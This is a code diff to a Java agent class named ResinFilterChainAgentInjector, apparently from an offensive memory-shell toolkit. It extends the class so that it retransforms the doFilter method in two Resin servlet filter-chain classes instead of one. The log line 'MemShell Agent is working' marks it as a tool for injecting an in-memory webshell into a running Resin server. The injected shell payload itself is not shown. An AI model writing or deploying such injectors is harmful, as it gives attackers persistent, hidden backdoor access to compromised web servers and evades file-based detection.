@@ -14,9 +14,11 @@ import java.util.zip.GZIPInputStream;
  * @since 2025/3/26
  */
 public class ResinFilterChainAgentInjector implements ClassFileTransformer {
-    private static final String TARGET_CLASS = "com/caucho/server/dispatch/FilterFilterChain";
     private static final String TARGET_METHOD_NAME = "doFilter";
-
+    private static final String[] TARGET_CLASSES = new String[]{
+            "com/caucho/server/http/FilterChainFilter",
+            "com/caucho/server/dispatch/FilterFilterChain",
+    };
     public static String getClassName() {
         return "{{advisorName}}";
     }
@@ -38,8 +40,10 @@ public class ResinFilterChainAgentInjector implements ClassFileTransformer {
         inst.addTransformer(new ResinFilterChainAgentInjector(), true);
         for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
             String name = allLoadedClass.getName();
-            if (TARGET_CLASS.replace("/", ".").equals(name)) {
-                inst.retransformClasses(allLoadedClass);
+            for (String targetClass : TARGET_CLASSES) {
+                if (targetClass.replace("/", ".").equals(name)) {
+                    inst.retransformClasses(allLoadedClass);
+                }
             }
         }
     }
@@ -48,22 +52,24 @@ public class ResinFilterChainAgentInjector implements ClassFileTransformer {
     @SuppressWarnings("all")
     public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                             ProtectionDomain protectionDomain, byte[] bytes) {
-        if (TARGET_CLASS.equals(className)) {
-            defineTargetClass(loader);
-            try {
-                ClassReader cr = new ClassReader(bytes);
-                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
-                    @Override
-                    protected ClassLoader getClassLoader() {
-                        return loader;
-                    }
-                };
-                ClassVisitor cv = getClassVisitor(cw);
-                cr.accept(cv, ClassReader.EXPAND_FRAMES);
-                System.out.println("MemShell Agent is working at " + TARGET_CLASS.replace("/", ".") + "." + TARGET_METHOD_NAME);
-                return cw.toByteArray();
-            } catch (Exception e) {
-                e.printStackTrace();
+        for (String targetClass : TARGET_CLASSES) {
+            if (className.equals(targetClass)) {
+                defineTargetClass(loader);
+                try {
+                    ClassReader cr = new ClassReader(bytes);
+                    ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+                        @Override
+                        protected ClassLoader getClassLoader() {
+                            return loader;
+                        }
+                    };
+                    ClassVisitor cv = getClassVisitor(cw);
+                    cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                    System.out.println("MemShell Agent is working at " + targetClass.replace("/", ".") + "." + TARGET_METHOD_NAME);
+                    return cw.toByteArray();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
             }
         }
         return bytes;
